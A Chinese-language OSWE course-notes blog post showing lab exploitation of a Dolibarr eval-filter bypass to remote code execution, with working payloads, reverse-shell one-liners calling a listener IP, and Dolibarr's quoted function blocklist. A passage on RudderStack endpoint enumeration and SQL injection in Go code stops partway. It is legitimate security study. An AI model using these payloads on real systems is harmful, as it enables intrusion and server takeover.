---
title: "[OSWE, WEB-300] Instructional notes - Part 6"
date: 2026-05-18
author: "CHW"
tags:
  - offsec
description: "OSWA WEB-300 筆記 Part 6，涵蓋 Dangerous Functions、Bypass Security Filter to Trigger Eval、Dolibarr Eval Filter Bypass RCE、PostgreSQL SQL injection、Bypass WAF、oraza WAF、RudderStack SQLi and Coraza WAF Bypass 等等。"
---

[OSWE, WEB-300] Instructional notes - Part 6
===


# Table of Contents
[TOC]

# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/)


>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 5](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-5/) 內容

# Dolibarr Eval Filter Bypass RCE
許多程式語言的 core libraries 或 default functionality 中包含 [Potentially](https://cwe.mitre.org/data/definitions/676.html) 且  [Inherently](https://cwe.mitre.org/data/definitions/242.html) 危險函數\
雖然這些函數的性質因語言而異，但它們通常能夠直接操作 memory、在不檢查 memory allocation 情況下執行操作、[run application code](https://cwe.mitre.org/data/definitions/95.html) 或運行 OS commands

分析 enterprise resource planning (ERP) 和 customer relationship management (CRM) 常用的 [Dolibarr](https://www.dolibarr.org/) 防護邏輯並繞過

## Getting Started
### Using the Lab
- Code server: http://dolibarr:8000\
![image](https://hackmd.io/_uploads/B1pAcUX1Gl.png)\
(studentlab 登入)\
![image](https://hackmd.io/_uploads/HkIvs8Qkfl.png)
> VSCode [code-server](https://coder.com/docs/code-server)
- SSH: `student`:`studentlab`\
![image](https://hackmd.io/_uploads/SkmGiIX1Gl.png)
- Web: http://dolibarr/dolibarr/ \
![image](https://hackmd.io/_uploads/rySln8mJMl.png)
(`admin`:`studentlab` 登入)\
![image](https://hackmd.io/_uploads/rkEs08X1fe.png)

### Enabling Step Debugging
啟用 Debugging\
![image](https://hackmd.io/_uploads/SJrg1wQkzx.png)

## Overview of Dangerous Functions
在分析 source code 時，特別注意可能導致 serious vulnerabilities 的危險 functions\
若使用者將輸入傳遞給這些 functions，或許可以建構惡意輸入來利用漏洞

C 語言的 [gets()](https://en.cppreference.com/c/io/gets) 當例子:
```cpp
char *gets( char *str );
```
> 從 stdin 讀資料直接放進 buffer，完全不檢查長度

例如:
```cpp
char buf[10];
gets(buf);
```
> 若輸入 `AAAAAAAAAAAAAAAAAAAA` 就會 overflow

Overflow 可能覆蓋 `return address`, `saved registers`, `function pointers`\
最後控制 RIP/EIP\
→ shellcode execution
→ RCE

### JavaScript eval()
[JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)、 [PHP](https://www.php.net/manual/en/function.eval.php) 和 [Python](https://docs.python.org/3/library/functions.html#eval) 各自都有自己的eval() function。通常，函數會像處理原始程式碼一樣評估字串，並傳回結果值\
以 JS 為例，透過 Web Developer Tools 的 Console tab 實作
- `eval("3+4")`
![image](https://hackmd.io/_uploads/B1M2fMEyfg.png)
> 當 JavaScript 運算式執行
- `eval("console.log('hello eval world')")`
> 字串內容會被當成 JavaScript function call 執行

Note📝: 若 user input 進入前端 eval()\
👉🏻 攻擊者可以執行任意 JavaScript\
👉🏻 本質就是 XSS
**" client-side eval injection "**

### PHP eval()
PHP 的 `eval()` 更直接危險，因為 PHP 通常跑在 server 上
SSH 連線至環境範例，實作 PHP:
![image](https://hackmd.io/_uploads/HyBNwzE1fg.png)

- `eval("3+4")`
![image](https://hackmd.io/_uploads/Syj9PzNyGx.png)
- `eval("echo exec('whoami');");`
![image](https://hackmd.io/_uploads/BkLhvGNyMg.png)
> 只執行 `exec('whoami');` 不會顯示結果
- eval()
→ 執行 PHP code
- exec('whoami')
→ 執行 OS command
- echo
→ 把結果印出來

## Vulnerability Discovery
先找 dangerous sink 再往回追 controllable input

在 review source code 是否存在漏洞時，可以採用的一種方法尋找 dangerous functions\
首先要辨識資料 [sinks](https://en.wikipedia.org/wiki/Sink_(computing))，若找到危險函數可以追溯其來源，找到輸入來源

Sink | 危險行為 | 
:------:|:---------------------|
`eval()`  |    執行 PHP code    | 
`exec()`  |    執行 OS command    | 
`system()`  |    執行 shell command    | 
`include()`  |    動態載入檔案    | 
`unserialize()`  |    Object injection    | 

### Dolibarr Source Code Analysis
回到環境範例：http://dolibarr:8000/?workspace=/home/student/dolibarr.code-workspace \
搜尋 dangerous function: `exec()`, `passthru()`, `system()`, `shell_exec()`\
![image](https://hackmd.io/_uploads/HJYtlmNJfl.png)
> 276 results in 101 files

發現好幾個結果都與 `dol_eval()` function 相關
利用 ` eval(`可以更精準找到單純 eval function 的內容\
![image](https://hackmd.io/_uploads/HynZZBV1zg.png)
> 縮小到  31 results in 14 files

在 `htdocs/core/lib/functions.lib.php` 中 L8943:\
(依據檔名能夠猜測是核心共用 library)
```php
8943  /**
8944  * Replace eval function to add more security.
8945  * This function is called by verifCond() or trans() and transnoentitiesnoconv().
8946  *
8947  * @param 	string	$s					String to evaluate
8948  * @param	int		$returnvalue		0=No return (used to execute eval($a=something)). 1=Value of eval is returned (used to eval($something)).
8949  * @param   int     $hideerrors     	1=Hide errors
8950  * @param	string	$onlysimplestring	'0' (used for computed property of extrafields)=Accept all chars, '1' (most common use)=Accept only simple string with char 'a-z0-9\s^$_+-.*>&|=!?():"\',/@';',  '2' (not used)=Accept also ';[]'
8951  * @return	mixed						Nothing or return result of eval
8952  */
8953  function dol_eval($s, $returnvalue = 0, $hideerrors = 1, $onlysimplestring = '1')
```
> `0=No return (used to execute eval($a=something)). 1=Value of eval is returned (used to eval($something))`
> 公佈答案:\
> `dol_eval()`函數是`eval()` 函數的安全替代方案
> 函數使用`$onlysimplestring`值來決定允許哪些字元，需要進一步審查函數了解此檢查的工作原理以及其他任何保護性控制措施

可得知防護核心是 Character Filtering，同時在 L9051 能夠看到
```php
9051  if ($returnvalue) {
9052      if ($hideerrors) {
9053          return @eval('return '.$s.';');
9054      } else {
9055          return eval('return '.$s.';');
9056      }
9057  } else {
9058      if ($hideerrors) {
9059          @eval($s);
9060      } else {
9061          eval($s);
9062      }
9063  }
```
> 可以看出開發者不想讓頁面跳出 Error message
> - `return eval(‘return ‘.$s.’;’)`: 若 `$s = "3+4"` 會輸出 `eval('return 3+4;');`
> - else `@eval($s);`: $s 可以是完整 PHP code
> - `@eval(...)`: suppress error 隱藏 PHP error message
> BTW `@` 是 [error control operator](https://www.php.net/manual/en/language.operators.errorcontrol.php)

現在已知 dol_eval() 最終會呼叫 eval()
👉🏻 找誰呼叫 dol_eval()\
![image](https://hackmd.io/_uploads/BJVfLBNkMg.png)
> 131 results in 56 files\
> wrapper 被整個系統大量使用

### Understanding the Filter Conditions
分析 Dolibarr 怎麼防 eval injection:
`$onlysimplestring` 決定了該 函數允許輸入哪些字元。讓我們回顧一下它的實現，它從第 8969 行開始。
```php
8968  // Test on dangerous char (used for RCE), we allow only characters to make PHP variable testing
8969  if ($onlysimplestring == '1') {
8970      // We must accept: '1 && getDolGlobalInt("doesnotexist1") && $conf->global->MAIN_FEATURES_LEVEL'
8971      // We must accept: '$conf->barcode->enabled || preg_match(\'/^AAA/\',$leftmenu)'
8972      // We must accept: '$user->rights->cabinetmed->read && !$object->canvas=="patient@cabinetmed"'
8973      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@', '/').']/i', $s)) {
8974          if ($returnvalue) {
8975              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8976          } else {
8977              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8978              return '';
8979          }
8980          // TODO
8981          // We can exclude all parenthesis ( that are not '($db' and 'getDolGlobalInt(' and 'getDolGlobalString(' and 'preg_match(' and 'isModEnabled('
8982          // ...
8983      }
8984  } elseif ($onlysimplestring == '2') {
8985      // We must accept: (($reloadedobj = new Task($db)) && ($reloadedobj->fetchNoCompute($object->id) > 0) && ($secondloadedobj = new Project($db)) && ($secondloadedobj->fetchNoCompute($reloadedobj->fk_project) > 0)) ? $secondloadedobj->ref : "Parent project not found"
8986      if (preg_match('/[^a-z0-9\s'.preg_quote('^$_+-.*>&|=!?():"\',/@;[]', '/').']/i', $s)) {
8987          if ($returnvalue) {
8988              return 'Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s;
8989          } else {
8990              dol_syslog('Bad string syntax to evaluate (found chars that are not chars for simplestring): '.$s);
8991              return '';
8992          }
8993      }
8994  }
```
> - mode 1: \
> 允許 `a-z`, `0-9`, `空白`, 部分特殊字元
> - mode 2: \
> 多允許 `[]`\
> (在 PHP 中 `$arr[0]`需要 `[]` 做 array index access)

🧠：當 `$onlysimplestring = '0'` 或 `$onlysimplestring = 'chw'`不在 if/else 中，完全不會做字元過濾

在 L8995-9021 仍有過濾特殊字元
```php
8995  if (is_array($s) || $s === 'Array') {
8996      return 'Bad string syntax to evaluate (value is Array) '.var_export($s, true);
8997  }
8998  if (strpos($s, '::') !== false) {
8999      if ($returnvalue) {
9000          return 'Bad string syntax to evaluate (double : char is forbidden): '.$s;
9001      } else {
9002          dol_syslog('Bad string syntax to evaluate (double : char is forbidden): '.$s);
9003          return '';
9004      }
9005  }
9006  if (strpos($s, '`') !== false) {
9007      if ($returnvalue) {
9008          return 'Bad string syntax to evaluate (backtick char is forbidden): '.$s;
9009      } else {
9010          dol_syslog('Bad string syntax to evaluate (backtick char is forbidden): '.$s);
9011          return '';
9012      }
9013  }
9014  if (preg_match('/[^0-9]+\.[^0-9]+/', $s)) {	// We refuse . if not between 2 numbers
9015      if ($returnvalue) {
9016          return 'Bad string syntax to evaluate (dot char is forbidden): '.$s;
9017      } else {
9018          dol_syslog('Bad string syntax to evaluate (dot char is forbidden): '.$s);
9019          return '';
9020      }
9021  }
```
> 額外阻擋：
> ```
> ::
> `
> .
> ```
> - 為什麼擋 `::`: `Class::method()`是 Scope Resolution Operator 可呼叫 static method，Ex. `ReflectionFunction::export()`
> - 為什麼擋 backtick : `whoami`等於 `shell_exec("whoami")`，backtick 本身就是 command execution
> - 為什麼擋 dot (.): `"a"."b"` 是 String Concatenation，可以拆組字串繞過防護

最後一組檢查在 L9023-9038 Forbidden Functions
```php
9023  // We block use of php exec or php file functions
9024  $forbiddenphpstrings = array('$$');
9025  $forbiddenphpstrings = array_merge($forbiddenphpstrings, array('_ENV', '_SESSION', '_COOKIE', '_GET', '_POST', '_REQUEST'));
9026  
9027  $forbiddenphpfunctions = array("exec", "passthru", "shell_exec", "system", "proc_open", "popen", "eval", "dol_eval", "executeCLI", "verifCond", "base64_decode");
9028  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("fopen", "file_put_contents", "fputs", "fputscsv", "fwrite", "fpassthru", "require", "include", "mkdir", "rmdir", "symlink", "touch", "unlink", "umask"));
9029  $forbiddenphpfunctions = array_merge($forbiddenphpfunctions, array("function", "call_user_func"));
9030  
9031  $forbiddenphpregex = 'global\s+\$|\b('.implode('|', $forbiddenphpfunctions).')\b';
9032  
9033  do {
9034      $oldstringtoclean = $s;
9035      $s = str_ireplace($forbiddenphpstrings, '__forbiddenstring__', $s);
9036      $s = preg_replace('/'.$forbiddenphpregex.'/i', '__forbiddenstring__', $s);
9037      //$s = preg_replace('/\$[a-zA-Z0-9_\->\$]+\(/i', '', $s);	// Remove $function( call and $mycall->mymethod(
9038  } while ($oldstringtoclean != $s);
```
> - forbiddenphpstrings 禁止 `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `$_SESSION`
> - forbiddenphpfunctions 禁止 `exec`, `system`, `shell_exec`, `eval`, `base64_decode`, `include`, `require`, `fopen`, `unlink`
> - 阻擋 base64_decode
> (Encoding 還包含 URL encoding, hex, octal, unicode, chr())
> - `$s = preg_replace(...)`: Regex Replace 直接替換字串\
> `exec("id")` 會變成 `__forbiddenstring__("id")`

開發者想阻止 RCE, File Write, LFI/RFI 等行為

Dolibarr 的防護是:
1. Character Restriction
2. 禁止特殊 operator
3. Blacklist Dangerous Function
4. Replace Forbidden String
不是 parser-level protection，string replacement

### Filter Bypass the Hard Way
🧠： 不出現 exec 字串，能不能呼叫 exec？

SSH 登入透過 function 列出目前 PHP 所有 function
```php
print_r(get_defined_functions());
```
![image](https://hackmd.io/_uploads/HJkCuwEyGg.png)

驗證是否可以根據  array index 呼叫函數\
嘗試呼叫 `strlen()`函數，根據輸出位於「internal」陣列的索引 4 
```php
php > echo get_defined_functions()["internal"][4]("hello world");
11
```
在查看`get_defined_functions()`傳回的完整值清單可以發現 Index 550 
```php
php > print_r(get_defined_functions());
Array
(
    [internal] => Array
        (
...
            [550] => exec
            [551] => system
            [552] => passthru
            [553] => escapeshellcmd
            [554] => escapeshellarg
            [555] => shell_exec
...
```
String Function Invocation
```
php > echo get_defined_functions()["internal"][550]("whoami");
student
```
![image](https://hackmd.io/_uploads/Hkb4ovN1Gg.png)
> = exec("whoami")

blacklist 也抓不到

若利用 `array_search()` 搜尋 exec 在哪個 index，但 blacklist 又禁止的情況下\
👉🏻 URL Encoding
```php
php > echo urldecode("%65%78%65%63");
exec
```
構造搜尋語句
```php
php > echo array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"]);
550
```
```
php > echo get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
student
```
現在 exploit chain 已經有了，需要找到適合的 sink context

## Bypass Security Filter to Trigger Eval
找出哪裡可以把 payload 丟進 dol_eval()\
目前已知 dol_eval() → 最終會 eval($s)\
且能夠 indirect invoke exec()

>[!Important]
>exploit 還缺最後一步:
>找 `dol_eval(..., '', ...)`\
>讓 filter 不會生效

### Finding the Target
找 exploitable call site，並不是所有 `dol_eval()` 都能 exploit\
需要找 `onlysimplestring != 1 && != 2`

```
dol_eval\(\$[\w\[\]']+,\s\d,\s\d,\s'(?!1|2)'\)
```
> 搜尋 `dol_eval(...)` 最後一個參數不是 1 或 2

![image](https://hackmd.io/_uploads/SyuXBUvkfg.png)
> 都在 `commonobject.class.php`
> - `insertExtraFields()`
> - `updateExtraFields()`
> - `showOutputField()`
> > 都有 `dol_eval(..., '')`

查看 showOutputField() function:\
🧠：WHY showOutputField()?\
return HTML string to show a field into a page\
當使用 whoami 時需要將 command output 顯示出來
```php
7432  /**
7433   * Return HTML string to show a field into a page
7434   * Code very similar with showOutputField of extra fields
7435   *
7436   * @param  array   $val            Array of properties of field to show
7437   * @param  string  $key            Key of attribute
7438   * @param  string  $value          Preselected value to show (for date type it must be in timestamp format, for amount or price it must be a php numeric value)
7439   * @param  string  $moreparam      To add more parametes on html input tag
7440   * @param  string  $keysuffix      Prefix string to add into name and id of field (can be used to avoid duplicate names)
7441   * @param  string  $keyprefix      Suffix string to add into name and id of field (can be used to avoid duplicate names)
7442   * @param  mixed   $morecss        Value for css to define size. May also be a numeric.
7443   * @return string
7444   */
7445  public function showOutputField($val, $key, $value, $moreparam = '', $keysuffix = '', $keyprefix = '', $morecss = '')
7446  {
...
7476      $computed = empty($val['computed']) ? '' : $val['computed'];
...
7511      // If field is a computed field, value must become result of compute
7512      if ($computed) {
7513          // Make the eval of compute string
7514          //var_dump($computed);
7515          $value = dol_eval($computed, 1, 0, '');
7516      }
...
7845      $out = $value;
7846  
7847      return $out;
7848  }
```
> - `$computed = $val['computed'];`: \
> 若 `$val['computed']` 可控，那 `$computed` 可控\
> - `$value = dol_eval($computed, 1, 0, '');`
> - `onlysimplestring = ''` 不做字元限制

Code flow :
```
User Input
→ $computed
→ dol_eval()
→ eval()
→ return output
→ 顯示在 HTML
```
```php
41  /**
42   *  Parent class of all other business classes (invoices, contracts, proposals, orders, ...)
43  */
44  abstract class CommonObject
45  {
```
> `abstract class CommonObject` 是 Parent Class
> 所有 extends CommonObject 的 class 都可以繼承這個漏洞

![image](https://hackmd.io/_uploads/BkPfwIvkGe.png)
> 154 results in 130 files\
> 可以擴大攻擊面

直接從 UI 找 reachable functionality\
admin:studentlab 登入 http://dolibarr/dolibarr/index.php\
查看 `http://dolibarr/dolibarr/admin/modules.php?mainmenu=home` 哪些 module 已啟用\
![image](https://hackmd.io/_uploads/rkIAPIvkzl.png)\
只有 Users & Groups module 啟用：\
![image](https://hackmd.io/_uploads/S1dgOUwkfx.png)

子選項的 "Complementary attributes (Users)" 允許定義自訂 attributes 包括 Computed field\
![image](https://hackmd.io/_uploads/ByJ5O8DJzl.png)\
與之前發現易受攻擊的功能相符\
點擊加號（+）新增一個屬性，並查看 Computed field\
![image](https://hackmd.io/_uploads/ByeBZK8P1zg.png)
>  "any PHP coding to get a dynamic computed value" 🤔
> For Hacker: User-controlled PHP code execution

先測試 4+7，確認 input 是否真的進 eval()\
![image](https://hackmd.io/_uploads/r1YrtIDkfl.png)\
![image](https://hackmd.io/_uploads/ByaSFIv1Mx.png)
> payload 真的被 eval

真正 exploit
```php
get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
```
在 `http://dolibarr/dolibarr/user/list.php` 能夠查看 Users List 觸發:\
![image](https://hackmd.io/_uploads/S1UOYLPJMx.png)

###  Getting a Reverse Shell
```
get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.189/8888 0>&1'");
```
![image](https://hackmd.io/_uploads/BJJkRUDkfe.png)\
Users List 觸發:\


(Kali)
```
┌──(chw💲CHW)-[~]
└─$ nc -nvlp 8888
[2026-05-17 11:07:48] nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.204.141] 42796
bash: cannot set terminal process group (1249): Inappropriate ioctl for device
bash: no job control in this shell
<arr-243-154:/usr/share/dolibarr/htdocs/user/admin$whoami
whoami
www-data
www-data@dolibarr:/usr/share/dolibarr/htdocs/user/admin$ 
```
##  Filter Bypass Revisited
Blocklist 永遠擋不完，環境範例 Dolibarr 把危險字串 blacklist 掉\
→ eval 就安全\
🥚 問題在於 PHP 太 dynamic

除了 `exec('id')`，可以間接做到
- 間接呼叫
- 動態產生字串
- reflection
- encoding
- string manipulation

🧠：分析 restriction 思考 PHP 還剩什麼 primitive

### Using Reflection
Reflection 是程式在 runtime 操作自己的能力，例如: 動態建立 class、動態呼叫 method、取得 function metadata\
PHP ReflectionFunction 根據 function name 建立 function object (`new ReflectionFunction("exec")`)\
然後 `invoke()` 等於做到 `然後 invoke()`

### Different Encodings
⚠️ Encoding 不只有 Base64
- gzip: `gzencode()`, `gzdecode()`
- str_rot13(): PHP 內建 `str_rot13()`
- Hex Encoding

### Alternate String Modifications
不用 encoding 做 Dynamic String Construction
- str_replace():
```php
str_replace("z", "e", "zxzc")
```
> runtime 結果仍是 exec
- implode():
```php
implode("x", array("e","ec"))
```
- strip_tags():
```php
strip_tags("ex<a>ec")
```

[環境範例]\
Harden 過的 Blacklist rule\
Payload:\
```
(new ReflectionFunction(str_replace("z","e","zxzc")))->invoke("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.189/8888 0>&1'");
```
![image](https://hackmd.io/_uploads/HyBhbvPJzg.png)\
![image](https://hackmd.io/_uploads/rkEobDDyGe.png)

# RudderStack SQLi and Coraza WAF Bypass
API + SQL Injection + WAF Bypass 很典型的現代 Web/API assessment
## Getting Started
[RudderStack](https://github.com/rudderlabs/rudder-server) 是 Customer Data Platform (CDP)，類似 Segment、Mixpanel、Analytics pipeline\
會接收大量 event data、tracking data、user analytics

因為大量 dynamic query、filtering、search、reporting、aggregation 常有 SQLi

- Web UI: `http://rudderstack:8000/?folder=/home/student`
![image](https://hackmd.io/_uploads/S1sABgO1fe.png)
可以存取 code-server 可透過瀏覽器存取的 Visual Studio Code (VSCode)\
`student`:`studentlab` 登入\
![image](https://hackmd.io/_uploads/HJ59Lgu1fg.png)

- SSH: `student`:`studentlab` 登入
![image](https://hackmd.io/_uploads/H1o0DeOkGx.png)\
RudderStack VM 使用 docker 運行  RudderStack 和 [OWASP Coraza WAF](https://www.coraza.io/)
![image](https://hackmd.io/_uploads/BJUe_xu1zx.png)

Container | 用途 | 
:------:|:---------|
student_caddy_1  |  Reverse proxy + WAF |
student_backend_1  |  RudderStack backend |
student_db_1  |  PostgreSQL |

>[!Tip]
> 查看 docker 架構目的在於：
> 可以同時測：
> - Port 80
> Client
> → WAF
> → Backend
> - Port 8080
> Client
> → Backend directly
>
> 可以透過這個架構測試 WAF blocked? 還是 backend blocked?
> - 8080 成功代表 backend vulnerable
> - 80 被擋代表 WAF 規則攔截
>
> 在嘗試 WAF bypass 過程中可以得知是 SQL syntax 還是 Payload Signature

docker exec 可以進到 container:
```
docker exec -it student_db_1 /bin/sh
```
Container Inspection 可能會需要看 DB schema、logs、WAF config、CRS rule 等等
## RudderStack SQL Injection Vulnerability
從 Source Code 找 unauthenticated SQLi\
如何從大型 Go API 專案做 attack surface enumeration

### Discovering the SQL Injection Vulnerability
API Attack Surface Enumeration

從 API versioning 下手:\
透過 [rudderstack API documentation](https://www.rudderstack.com/docs/api/) 可以得知 `/v1/`, `/v2/`\
![image](https://hackmd.io/_uploads/r11bbbdJzg.png)

API routing 通常有固定 pattern，例如 `/api/`, `/v1/`, `/graphql`, `/rest`, `/internal`

到 Code server `http://rudderstack:8000/?folder=/home/student/rudder-server-1.2.5.`
![image](https://hackmd.io/_uploads/Hkh_WW_kfg.png)\
搜尋 *.go (需要排除 *_test.go 過濾污染結果)\
![image](https://hackmd.io/_uploads/SkiobbuJMl.png)
> 40 results in 9 files.

在  gateway.go 有多個結果包含字串，字串似乎是傳遞給 HandleFunc() function 的 API 路徑\
分析 `StartWebHandler()` function 的開頭部分包含了gateway.go 檔案中的大部分搜尋結果
```go
1417  /*
1418  StartWebHandler starts all gateway web handlers, listening on gateway port.
1419  Supports CORS from all origins.
1420  This function will block.
1421  */
1422  func (gateway *HandleT) StartWebHandler(ctx context.Context) error {
1423  	gateway.logger.Infof("WebHandler waiting for BackendConfig before starting on %d", webPort)
1424  	gateway.backendConfig.WaitForConfig(ctx)
1425  	gateway.logger.Infof("WebHandler Starting on %d", webPort)
1426  
1427  	srvMux := mux.NewRouter()
1428  	srvMux.Use(
1429  		middleware.StatMiddleware(ctx, srvMux),
1430  		middleware.LimitConcurrentRequests(maxConcurrentRequests),
1431  	)
1432  	srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
1433  	srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
1434  	srvMux.HandleFunc("/v1/track", gateway.webTrackHandler).Methods("POST")
```
> 直接瀏覽 source 看 endpoint 就不用透過 fuzzing path

啟動 Web 處理 process，程式碼使用 srvMux 物件的 HandleFunc() 函數註冊每個端點\
查看 gateway.go 檔案開頭的導入語句，會發現程式碼導入了 github.com/gorilla/mux ，是一個請求 router 和 dispatcher 會將 URL 路徑對應到處理程序\
Ex. 若 application 收到一個發送到 `/v1/batch`的 POST request，會將該請求傳遞給 `gateway.webBatchHandler`

用 Burp Suite 觀察 request 並 COPY ALL 貼到 Kali 整理
```
┌──(chw💲CHW)-[~/Offsec/OSWE/rudderstack]
└─$ head routes.txt
/home/student/rudder-server-1.2.5/cmd/devtool/commands/event.go
  60,24:        url := fmt.Sprintf("%s/v1/batch", c.String("endpoint"))

/home/student/rudder-server-1.2.5/config/backend-config/namespace_config.go
  84,35:        u.Path = fmt.Sprintf("/data-plane/v1/namespaces/%s/config", nc.Namespace)

/home/student/rudder-server-1.2.5/gateway/gateway.go
  989,24:       uri := fmt.Sprintf(`%s/v1/warehouse/pending-events?triggerUpload=true`, misc.GetWarehouseURL())
  1432,21:      srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
  1433,21:      srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
```
Semi-automated Route Extraction
```
┌──(chw💲CHW)-[~/Offsec/OSWE/rudderstack]
└─$ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2
%s/v1/batch
/data-plane/v1/namespaces/%s/config
`%s/v1/warehouse/pending-events?triggerUpload=true`
/v1/batch
/v1/identify
/v1/track
/v1/page
/v1/screen
/v1/alias
...
```
建立 endpoint wordlist: `routes_clean.txt`
```
rep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2 | sort > routes_clean.txt
```
![image](https://hackmd.io/_uploads/HJBg9Z_Jfl.png)

接著透過 Burp Intruder 做動態測試\
掛 Burp 瀏覽 http://rudderstack:8080/ \
![image](https://hackmd.io/_uploads/S1u2cbu1Mx.png)\
將 HTTP request 與 endpoint 都加入 payload positions\
![image](https://hackmd.io/_uploads/r1d69buyfe.png)\
建立 wordlist\
![image](https://hackmd.io/_uploads/BJ-0q-d1fe.png)

快速找 reachable endpoint 和 unexpected behavior

- `/v1/warehouse/pending-events?triggerUpload=true` POST: 回應 400
![image](https://hackmd.io/_uploads/B1dPs-_Jfl.png)
> can’t unmarshall body
> > Go `json.Unmarshal()` 代表 JSON Parsing\
> > 得知 endpoint 真的存在且期待 JSON body

將回應 400 的 6 個 endpoint 紀錄並回到 source code 分析\ 
![image](https://hackmd.io/_uploads/B1D0jb_yfx.png)

快速定位 vulnerable logic，查看 gateway.go
```go
1462  srvMux.HandleFunc("/v1/pending-events", WithContentType("application/json; charset=utf-8", gateway.pendingEventsHandler)).Methods("POST")
1463  srvMux.HandleFunc("/v1/failed-events", WithContentType("application/json; charset=utf-8", gateway.fetchFailedEventsHandler)).Methods("POST")
1464  srvMux.HandleFunc("/v1/warehouse/pending-events", gateway.whProxy.ServeHTTP).Methods("POST")
1465  srvMux.HandleFunc("/v1/clear-failed-events", gateway.clearFailedEventsHandler).Methods("POST")
```
> - L1464 沒有為 `/v1/warehouse/pending-events` 定義 content type
> - L1462 和 L1463 已將預期內容類型設為 JSON

回到 Burp 使用 Content-Type: application/json 送出：\
![image](https://hackmd.io/_uploads/S1wp2Wdyze.png)
> "empty source id".

再回到 IDE 搜尋\
![image](https://hackmd.io/_uploads/HkgypZuyfg.png)
> 3 results in 2 files

warehouse.go
```go
1673	// unmarshall body
1674	var pendingEventsReq warehouseutils.PendingEventsRequestT
1675	err = json.Unmarshal(body, &pendingEventsReq)
1676	if err != nil {
1677		pkgLogger.Errorf("[WH]: Error unmarshalling body: %v", err)
1678		http.Error(w, "can't unmarshall body", http.StatusBadRequest)
1679		return
1680	}
1681  
1682	sourceID := pendingEventsReq.SourceID
1683
1684	// return error if source id is empty
1685	if sourceID == "" {
1686		pkgLogger.Errorf("[WH]: pending-events:  Empty source id")
1687		http.Error(w, "empty source id", http.StatusBadRequest)
1688		return
1689	}
```
> - L1682 定義 sourceID 變數\
> 由於 request中缺少必要的值，因此 L1685 的 if 判斷為 true，導致收到 L1687 的 error message
> - L1674 將 pendingEventsReq 的類型宣告為 `warehouseutils.PendingEventsRequestT`

在 IDE 中搜尋 `PendingEventsRequestT` 可以在`warehouse/utils/utils.go` 的 L321-324 找到它被宣告為一個 struct
```go
321  type PendingEventsRequestT struct {
322    SourceID  string `json:"source_id"`
323    TaskRunID string `json:"task_run_id"`
324  }
```

重新構造 Request ，需要在 JSON body 中包含 `source_id` 和 `task_run_id`\
![image](https://hackmd.io/_uploads/SyGWyMd1fe.png)
> HTTP 200 代表構造成功且無需身份驗證即可呼叫 API 

warehouse.go 的 `pendingEventsHandler()` function
```go
1691  pendingEvents := false
1692  var pendingStagingFileCount int64
1693  var pendingUploadCount int64
1694  
1695  // check whether there are any pending staging files or uploads for the given source id
1696  // get pending staging files
1697  pendingStagingFileCount, err = getPendingStagingFileCount(sourceID, true)
1698  if err != nil {
1699      err := fmt.Errorf("error getting pending staging file count : %v", err)
1700      pkgLogger.Errorf("[WH]: %v", err)
1701      http.Error(w, err.Error(), http.StatusInternalServerError)
1702      return
1703  }
```
> L1697 行將 sourceID 值傳遞給 getPendingStagingFileCount()
函數 

在 L1777 行找到 getPendingStagingFileCount()
```go
1777  func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCount int64, err error) {
1778      sourceOrDestColumn := ""
1779      if isSourceId {
1780          sourceOrDestColumn = "source_id"
1781      } else {
1782          sourceOrDestColumn = "destination_id"
1783      }
1784      var lastStagingFileIDRes sql.NullInt64
1785      sqlStatement := fmt.Sprintf(`
1786          SELECT 
1787            MAX(end_staging_file_id) 
1788          FROM 
1789            %[1]s 
1790          WHERE 
1791            %[1]s.%[3]s = '%[2]s';
1792  `,
1793          warehouseutils.WarehouseUploadsTable,
1794          sourceOrDestId,
1795          sourceOrDestColumn,
1796      )
1797  
1798      err = dbHandle.QueryRow(sqlStatement).Scan(&lastStagingFileIDRes)
```
> - L1785 - 1796 使用 Sprintf() 建立 SQL 語句，此函數將 sourceOrDestId 值寫入 SQL 語句中\
> 看似於參數化查詢，但實際不具備任何防止 SQLi 的保護措施。程式碼建立了sqlStatement 並將 user 提供的值插入 WHERE 子句的 sourceOrDestId 欄位中
> -  L1798 行執行 SQL 語句。由於程式碼透過字串格式化將第 1793 行到 1795 行的變數寫入了sqlStatement對象，因此這些變數不會作為參數傳遞給 dbHandle.QueryRow()函數。

